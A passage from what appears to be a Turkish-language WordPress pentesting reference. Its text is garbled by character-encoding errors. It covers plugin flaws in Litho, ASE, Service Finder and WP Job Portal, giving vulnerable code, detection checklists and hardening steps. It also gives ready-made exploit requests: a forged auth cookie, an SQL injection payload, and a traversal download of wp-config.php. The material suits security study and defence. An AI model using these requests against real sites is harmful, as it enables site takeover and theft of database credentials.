`wp-config.php` *uploads* klasÃ¶rÃ¼nÃ¼n dÄ±ÅŸÄ±nda bulunduÄŸu iÃ§in, varsayÄ±lan kurulumda dÃ¶rt `../` dizisi yeterlidir. `wp-config.php`'yi silmek bir sonraki ziyarette WordPress'i *kurulum sihirbazÄ±* durumuna sokar ve tam site ele geÃ§irmeye olanak verir (saldÄ±rgan sadece yeni bir DB yapÄ±landÄ±rmasÄ± saÄŸlar ve bir admin user oluÅŸturur).

DiÄŸer etkili hedefler arasÄ±nda plugin/theme `.php` dosyalarÄ± (security plugin'lerini bozmak iÃ§in) veya `.htaccess` kurallarÄ± yer alÄ±r.

#### Tespit kontrol listesi

* Dosya sistemi yardÄ±mcÄ±larÄ±nÄ± (`copy()`, `unlink()`, `$wp_filesystem->delete()`, vb.) Ã§aÄŸÄ±ran herhangi bir `add_action( 'wp_ajax_nopriv_...')` callback'i.
* TemizlenmemiÅŸ kullanÄ±cÄ± girdilerinin yollara eklenmesi (bak: `$_POST`, `$_GET`, `$_REQUEST`).
* `check_ajax_referer()` ve `current_user_can()`/`is_user_logged_in()` fonksiyonlarÄ±nÄ±n yokluÄŸu.

#### SertleÅŸtirme
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Her zaman** diskteki herhangi bir yazma/silme iÅŸlemini ayrÄ±calÄ±klÄ± olarak ele alÄ±n ve Ã§ift kontrol yapÄ±n:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

BirÃ§ok plugin, orijinal rol(leri) user meta iÃ§inde kaydederek daha sonra geri yÃ¼klenebilmeleri iÃ§in "view as role" veya geÃ§ici rol deÄŸiÅŸtirme Ã¶zelliÄŸi uygular. EÄŸer geri yÃ¼kleme yolu yalnÄ±zca request parametrelerine (Ã¶r. `$_REQUEST['reset-for']`) ve plugin tarafÄ±ndan tutulan bir listeye dayanÄ±yor ve capabilities ile valid nonce kontrolÃ¼ yapmÄ±yorsa, bu bir vertical privilege escalation haline gelir.

GerÃ§ek bir Ã¶rnek Admin and Site Enhancements (ASE) plugin (â‰¤ 7.6.2.1) iÃ§inde bulunmuÅŸtur. Reset dalÄ±, kullanÄ±cÄ± adÄ± dahili bir dizi `$options['viewing_admin_as_role_are']` iÃ§inde gÃ¶rÃ¼nÃ¼yorsa `reset-for=<username>` bazÄ±nda rolleri geri yÃ¼klÃ¼yordu, ancak mevcut rolleri kaldÄ±rÄ±p user meta `_asenha_view_admin_as_original_roles` iÃ§indeki kaydedilmiÅŸ rolleri tekrar eklemeden Ã¶nce ne bir `current_user_can()` kontrolÃ¼ ne de bir nonce doÄŸrulamasÄ± yapÄ±yordu:
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
Neden istismar edilebilir

- Sunucu tarafÄ± yetkilendirmesi olmadan `$_REQUEST['reset-for']` ve bir plugin seÃ§eneÄŸine gÃ¼venir.
- Daha Ã¶nce `_asenha_view_admin_as_original_roles` iÃ§inde daha yÃ¼ksek ayrÄ±calÄ±klara sahip olup yetkisi dÃ¼ÅŸÃ¼rÃ¼lmÃ¼ÅŸ bir kullanÄ±cÄ±, sÄ±fÄ±rlama yoluna eriÅŸerek bunlarÄ± geri yÃ¼kleyebilir.
- BazÄ± daÄŸÄ±tÄ±mlarda, yetkilendirme hatasÄ± nedeniyle herhangi bir kimlikli kullanÄ±cÄ±, `viewing_admin_as_role_are` iÃ§inde hÃ¢lÃ¢ bulunan baÅŸka bir kullanÄ±cÄ± adÄ±na reset tetikleyebilir (broken authorization).

SaldÄ±rÄ± Ã¶nkoÅŸullarÄ±

- Ã–zelliÄŸi etkin olan etkilenmiÅŸ plugin sÃ¼rÃ¼mÃ¼.
- Hedef hesabÄ±n, Ã¶nceki kullanÄ±mdan kalan ve user meta'da saklÄ± yÃ¼ksek ayrÄ±calÄ±klÄ± bir role sahip olmasÄ±.
- Herhangi bir doÄŸrulanmÄ±ÅŸ oturum; reset akÄ±ÅŸÄ±nda nonce/capability eksikliÄŸi.

Ä°stismar (Ã¶rnek)
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
ZayÄ±f yapÄ±landÄ±rmalarda bu, mevcut rolleri kaldÄ±rÄ±r ve kaydedilmiÅŸ orijinal rolleri (Ã¶rn. `administrator`) yeniden ekler; bu da ayrÄ±calÄ±klarÄ±n yÃ¼kselmesine yol aÃ§ar.

Detection checklist

- Rol deÄŸiÅŸtirme Ã¶zelliklerinde, kullanÄ±cÄ± meta verisinde â€œorijinal rolleriâ€ (Ã¶rn. `_asenha_view_admin_as_original_roles`) saklayan Ã¶ÄŸeleri arayÄ±n.
- SÄ±fÄ±rlama/geri yÃ¼kleme yollarÄ±nÄ± belirleyin:
  - KullanÄ±cÄ± adlarÄ±nÄ± `$_REQUEST` / `$_GET` / `$_POST` Ã¼zerinden okuyan.
  - Rolleri `add_role()` / `remove_role()` ile deÄŸiÅŸtiren ve bunu `current_user_can()` ile `wp_verify_nonce()` / `check_admin_referer()` kontrolleri olmadan yapan.
  - Yetkilendirmeyi aktÃ¶rÃ¼n yetenekleri yerine bir eklenti seÃ§enek dizisine (Ã¶rn. `viewing_admin_as_role_are`) dayandÄ±ran.

Hardening

- Her durum deÄŸiÅŸikliÄŸine yol aÃ§an kod dalÄ±nda yetenek kontrollerini zorunlu kÄ±lÄ±n (Ã¶rn. `current_user_can('manage_options')` veya daha sÄ±kÄ±).
- TÃ¼m rol/izin deÄŸiÅŸiklikleri iÃ§in nonce gerektirin ve doÄŸrulayÄ±n: `check_admin_referer()` / `wp_verify_nonce()`.
- Ä°stekle saÄŸlanan kullanÄ±cÄ± adlarÄ±na asla gÃ¼venmeyin; hedef kullanÄ±cÄ±yÄ± sunucu tarafÄ±nda, kimlik doÄŸrulanmÄ±ÅŸ aktÃ¶re ve aÃ§Ä±k politikaya gÃ¶re belirleyin.
- Profil/rol gÃ¼ncellemelerinde â€œorijinal rolleriâ€ durumu geÃ§ersiz kÄ±lÄ±n, bÃ¶ylece eski yÃ¼ksek ayrÄ±calÄ±klarÄ±n geri yÃ¼klenmesini engelleyin:
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- GeÃ§ici rol deÄŸiÅŸimleri iÃ§in minimum durum saklamayÄ± ve sÃ¼reli, yetki-korumalÄ± token'lar kullanmayÄ± dÃ¼ÅŸÃ¼nÃ¼n.

---

### Unauthenticated privilege escalation via cookieâ€‘trusted user switching on public init (Service Finder â€œsf-bookingâ€)

BazÄ± eklentiler user-switching yardÄ±mcÄ±larÄ±nÄ± public `init` hook'una baÄŸlar ve kimliÄŸi client-controlled cookie'den tÃ¼retir. EÄŸer kod `wp_set_auth_cookie()`'Ä± kimlik doÄŸrulama, capability ve geÃ§erli bir nonce doÄŸrulamasÄ± yapmadan Ã§aÄŸÄ±rÄ±yorsa, herhangi bir yetkilendirilmemiÅŸ ziyaretÃ§i rastgele bir kullanÄ±cÄ± ID'si ile zorla giriÅŸ yapabilir.

Tipik zayÄ±f desen (Service Finder Bookings â‰¤ 6.1'den basitleÅŸtirilmiÅŸ):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Neden istismar edilebilir

- Public `init` hook, handler'Ä±n kimliÄŸi doÄŸrulanmamÄ±ÅŸ kullanÄ±cÄ±lar tarafÄ±ndan eriÅŸilebilir olmasÄ±nÄ± saÄŸlar (hiÃ§bir `is_user_logged_in()` korumasÄ± yok).
- Kimlik, istemci tarafÄ±ndan deÄŸiÅŸtirilebilen bir cookie (`original_user_id`) Ã¼zerinden tÃ¼retilir.
- DoÄŸrudan `wp_set_auth_cookie($uid)` Ã§aÄŸrÄ±sÄ±, istekte bulunan kiÅŸiyi herhangi bir capability/nonce kontrolÃ¼ olmadan o kullanÄ±cÄ± olarak oturum aÃ§tÄ±rÄ±r.

Ä°stismar (kimliÄŸi doÄŸrulanmamÄ±ÅŸ)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many highâ€‘impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

SaldÄ±rÄ± notlarÄ±

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Savunma notlarÄ±

- Donâ€™t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
AyrÄ±ca, **sadece gÃ¼venilir WordPress plugins and themes yÃ¼kleyin**.

### GÃ¼venlik Eklentileri

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **DiÄŸer Ã–neriler**

- VarsayÄ±lan **admin** kullanÄ±cÄ±sÄ±nÄ± kaldÄ±rÄ±n
- GÃ¼Ã§lÃ¼ **ÅŸifreler** ve **2FA** kullanÄ±n
- KullanÄ±cÄ±larÄ±n **izinlerini** periyodik olarak **gÃ¶zden geÃ§irin**
- **GiriÅŸ denemelerini sÄ±nÄ±rlayÄ±n** Brute Force saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in
- **`wp-admin.php`** dosyasÄ±nÄ±n adÄ±nÄ± deÄŸiÅŸtirin ve eriÅŸime yalnÄ±zca dahili aÄŸdan veya belirli IP adreslerinden izin verin.


### Kimlik doÄŸrulamasÄ± gerektirmeyen SQL Injection (yetersiz doÄŸrulama) (WP Job Portal <= 2.3.2)

WP Job Portal recruitment plugin, sonuÃ§ta **savecategory** gÃ¶revini aÃ§Ä±ÄŸa Ã§Ä±kardÄ±; bu gÃ¶rev en nihayetinde `modules/category/model.php::validateFormData()` iÃ§inde aÅŸaÄŸÄ±daki gÃ¼venli olmayan kodu Ã§alÄ±ÅŸtÄ±rÄ±yordu:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **TemizlenmemiÅŸ kullanÄ±cÄ± girdisi** â€“ `parentid` doÄŸrudan HTTP isteÄŸinden geliyor.
2. **WHERE cÃ¼mlesinde string birleÅŸtirme** â€“ `is_numeric()` / `esc_sql()` / prepared statement yok.
3. **KimliksÄ±z eriÅŸilebilirlik** â€“ iÅŸlem `admin-post.php` Ã¼zerinden Ã§alÄ±ÅŸtÄ±rÄ±lÄ±yor olmasÄ±na raÄŸmen, yerdeki tek kontrol **CSRF nonce** (`wp_verify_nonce()`), bu nonce'u herhangi bir ziyaretÃ§i `[wpjobportal_my_resumes]` shortcode'unu iÃ§eren bir aÃ§Ä±k sayfadan alabilir.

#### Ä°stismar

1. Taze bir nonce alÄ±n:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. `parentid`'i kÃ¶tÃ¼ye kullanarak arbitrary SQL enjekte edin:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
YanÄ±t enjekte edilen sorgunun sonucunu aÃ§Ä±ÄŸa Ã§Ä±karÄ±r veya veritabanÄ±nÄ± deÄŸiÅŸtirerek SQLi'yi kanÄ±tlar.


### KimliksÄ±z Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

BaÅŸka bir gÃ¶rev, **downloadcustomfile**, ziyaretÃ§ilere path traversal yoluyla diskteki **herhangi bir dosyayÄ±** indirme izni veriyordu. ZayÄ±f sink ÅŸu dosyada bulunur: `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` saldÄ±rgan tarafÄ±ndan kontrol ediliyor ve **girdi temizleme uygulanmadan** birleÅŸtiriliyor. Yine, tek engel **CSRF nonce** olup bu nonce Ã¶zgeÃ§miÅŸ sayfasÄ±ndan alÄ±nabilir.

#### Ä°stismar
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Sunucu `wp-config.php` iÃ§eriÄŸini dÃ¶ndÃ¼rÃ¼yor, leaking DB credentials and auth keys.

## Referanslar

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
